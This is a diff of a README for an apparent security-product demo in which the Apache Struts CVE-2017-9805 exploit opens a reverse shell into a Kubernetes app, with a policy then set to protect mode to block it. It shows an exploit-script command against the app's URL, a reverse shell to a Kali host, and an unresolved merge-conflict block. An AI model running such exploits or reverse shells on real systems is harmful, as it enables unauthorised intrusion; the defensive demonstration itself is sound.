@@ -5,7 +5,12 @@ This demo creates a remote shell using the Apache Struts CVE-2017-9805 Exploit
 ## Prep
 make sure you have the following two variables set in  your `terraform.tfvars`.
 ```
+<<<<<<< HEAD
 install_orders     = true
+=======
+install_kali = true
+install_order     = true
+>>>>>>> main
 ```
 
 The run
@@ -59,6 +64,6 @@ python3 /payloads/struts-pwn2.py --exploit --url 'http://URL/super-app/orders/3'
 where `X.X.X.X` is the IP to the kali service you got in step 4
 and the URL is the HOSTS of struts-orders ingress `kubectl get ingress struts-orders`
 
-7. In the recerse shell type some commands, like prove you are root with `whoami`
+7. In the reverse shell type some commands, like prove you are root with `whoami`
 
 8. Put the policy group `nv.struts-orders.default` in protect mode and see that it is now protected and it's no longer possible to execute commands in the reversed shell
